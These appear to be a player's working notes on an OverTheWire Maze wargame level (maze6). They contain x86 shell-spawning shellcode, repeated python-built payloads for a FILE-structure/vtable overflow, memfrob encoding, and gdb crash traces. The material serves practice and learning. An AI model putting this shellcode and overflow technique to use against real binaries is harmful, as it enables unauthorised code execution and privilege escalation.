[0x6a, 0x46, 0x58, 0x31, 0xdb, 0x31, 0xc9, 0xcd, 0x80, 0x31, 0xd2, 0x6a, 0x0b, 0x58, 0x52, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0x53, 0x89, 0xe1, 0xcd, 0x80]
\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80
0xf7fc3960  - IO_file_jumps
0xffffd554


much closer...
I looked through http://www.ouah.org/fsp-overflows.txt, which seems to be the best resource that I am able to find on the subject. 

/tmp/naania/fil $(python -c "print 'D'*63 + '\x40\x6c\x72\x1b\xf1\x1b\xe3\xe7\xaa\x1b\xf8\x40\x21\x72\x78\x42\x05\x05\x59\x42\x42\x05\x48\x43\x44\xa3\xc9\x78\x79\xa3\xcb\xe7\xaa' + '\x19\xff\xd5\xd5'*40 + '\x7e\xff\xd5\xd5'")
Fatal error: glibc detected an invalid stdio handle

Program received signal SIGABRT, Aborted.
0xf7fd7c99 in __kernel_vsyscall ()

(gdb) info stack
#0  0xf7fd7c99 in __kernel_vsyscall ()
#1  0xf7e3ddf0 in raise () from /lib32/libc.so.6
#2  0xf7e3f2b7 in abort () from /lib32/libc.so.6
#3  0xf7e793af in ?? () from /lib32/libc.so.6
#4  0xf7e793ec in __libc_fatal () from /lib32/libc.so.6
#5  0xf7e79d73 in ?? () from /lib32/libc.so.6
#6  0xf7e56b1d in ?? () from /lib32/libc.so.6
#7  0xf7e54191 in vfprintf () from /lib32/libc.so.6
#8  0xf7e5b7c8 in fprintf () from /lib32/libc.so.6
#9  0x0804860b in main (argc=3, argv=0xffffd694) at maze6.c:40


/tmp/naania/fil $(python -c "print 'D'*63 + '\x40\x6c\x72\x1b\xf1\x1b\xe3\xe7\xaa\x1b\xf8\x40\x21\x72\x78\x42\x05\x05\x59\x42\x42\x05\x48\x43\x44\xa3\xc9\x78\x79\xa3\xcb\xe7\xaa' + '\xae\xaa\x87\xd1\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x8a\x7f\xd6\xdd\x2b\x2a\x2a\x2a\x2a\x2a\x2a\x2a\xd5\xd5\xd5\xd5\x2a\x2a\x2a\x2a\x5a\x42\xd6\xdd\xd5\xd5\xd5\xd5\xd5\xd5\xd5\xd5\x2a\x2a\x2a\x2a\xca\x7e\xd6\xdd\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a' + '\x4a\x13\xd6\xdd' + '\xea\x76\xd6\xdd\x4a\x77\xd6\xdd' + '\x7e\xff\xd5\xd5'")

/tmp/naania/fil $(python -c "print 'D'*59 + '\x40\x6c\x72\x1b\xf1\x1b\xe3\xe7\xaa\x1b\xf8\x40\x21\x72\x78\x42\x05\x05\x59\x42\x42\x05\x48\x43\x44\xa3\xc9\x78\x79\xa3\xcb\xe7\xaa' + '\xae\xaa\x87\xd1\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x8a\x7f\xd6\xdd\x2b\xff\xff\xff\xff\xff\xff\xff\xd5\xd5\xd5\xd5\xff\xff\xff\xff\x5a\x42\xd6\xdd\xd5\xd5\xd5\xd5\xd5\xd5\xd5\xd5\xff\xff\xff\xff\xca\x7e\xd6\xdd\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff' + '\x4a\x13\xd6\xdd' + '\xea\x76\xd6\xdd\x4a\x77\xd6\xdd' + '\x35\xff\xd5\xd5'")

/tmp/naania/fil $(python -c "print 'D'*59 + '\x40\x6c\x72\x1b\xf1\x1b\xe3\xe7\xaa\x1b\xf8\x40\x21\x72\x78\x42\x05\x05\x59\x42\x42\x05\x48\x43\x44\xa3\xc9\x78\x79\xa3\xcb\xe7\xaa' + '\xae\xaa\x87\xd1\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x8a\x7f\xd6\xdd\x2b\xff\xff\xff\xff\xff\xff\xff\xd5\xd5\xd5\xd5\xff\xff\xff\xff\x5a\x42\xd6\xdd\xd5\xd5\xd5\xd5\xd5\xd5\xd5\xd5\xff\xff\xff\xff\xca\x7e\xd6\xdd\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff' + '\x4a\x13\xd6\xdd' + '\x4a\x13\xd6\xdd\x4a\x13\xd6\xdd' + '\x35\xff\xd5\xd5'")


filestream 0xffffd4f4
jumptable 0xffffd594
shellcode 0xffffd5b4
/tmp/naania/fil $(python -c "print '\xbe\xff\xd5\xd5'*37 + '\x9e\xff\xd5\xd5'*8 + '\x40\x6c\x72\x1b\xf1\x1b\xe3\xe7\xaa\x1b\xf8\x40\x21\x72\x78\x42\x05\x05\x59\x42\x42\x05\x48\x43\x44\xa3\xc9\x78\x79\xa3\xcb\xe7\xaa' + '\xde\xfe\xd5\xd5'*10 + 'D'*3 + '\xde\xfe\xd5\xd5'")
The above is generally what it should look like, however I asm still getting sigabort with the message Fatal error: glibc detected an invalid stdio handle


unset env LINES
unset env COLUMNS
set disassembly-flavor intel
alias ir=info register
b *main+171

https://www.anquanke.com/post/id/84987
https://www.jianshu.com/p/bb186f5eaee1?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation


k = memfrob_lookup_table()
stdout_fd = [
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0xa0, 0x55, 0xfc, 0xf7,
0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00,
0x70, 0x68, 0xfc, 0xf7, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00,
0xe0, 0x54, 0xfc, 0xf7, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00]
print("\\x" + "\\x".join([k.lookup_single_byte(i) for i in stdout_fd]))
/tmp/naania/fil $(python -c "print 'D'*108 + '' + '\x4a\xff\xd5\xd5'")




/tmp/naania/fil $(python -c "print 'D'*108 + '\x6e\x6e\x6e\x6e\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x8a\x7f\xd6\xdd\x2b\x2a\x2a\x2a\x2a\x2a\x2a\x2a\xd5\xd5\xd5\xd5\x2a\x2a\x2a\x2a\x5a\x42\xd6\xdd\xd5\xd5\xd5\xd5\xd5\xd5\xd5\xd5\x2a\x2a\x2a\x2a\xca\x7e\xd6\xdd\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x0e\xff\xd5\xd5' + '\x4a\xff\xd5\xd5'")
/tmp/naania/fil $(python -c "print 'D'*108 + '\x6e\x6e\x6e\x6e\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x8a\x7f\xd6\xdd\x2b\x2a\x2a\x2a\x2a\x2a\x2a\x2a\xd5\xd5\xd5\xd5\x2a\x2a\x2a\x2a\x5a\x42\xd6\xdd\xd5\xd5\xd5\xd5\xd5\xd5\xd5\xd5\x2a\x2a\x2a\x2a\xca\x7e\xd6\xdd\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a' + '\x4a\xff\xd5\xd5'")
/tmp/naania/fil $(python -c "print 'D'*108 + '\x6e\x6e\x6e\x6e\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x8a\x7f\xd6\xdd\x2b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\xd5\xd5\xd5\xd5\x6b\x6b\x6b\x6b\x5a\x42\xd6\xdd\xd5\xd5\xd5\xd5\xd5\xd5\xd5\xd5\x6b\x6b\x6b\x6b\xca\x7e\xd6\xdd\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b' + '\x4a\xff\xd5\xd5'")

sigabort from a bad file format, but passes further than before


/tmp/naania/fil $(python -c "print 'D'*108 + '\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x8a\x7f\xd6\xdd\x2b\x2a\x2a\x2a\x2a\x2a\x2a\x2a\xd5\xd5\xd5\xd5\x2a\x2a\x2a\x2a\x5a\x42\xd6\xdd\xd5\xd5\xd5\xd5\xd5\xd5\xd5\xd5\x2a\x2a\x2a\x2a\xca\x7e\xd6\xdd\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a' + '\x4a\xff\xd5\xd5'")





gdb -x /tmp/naania/.gdbinit /maze/maze6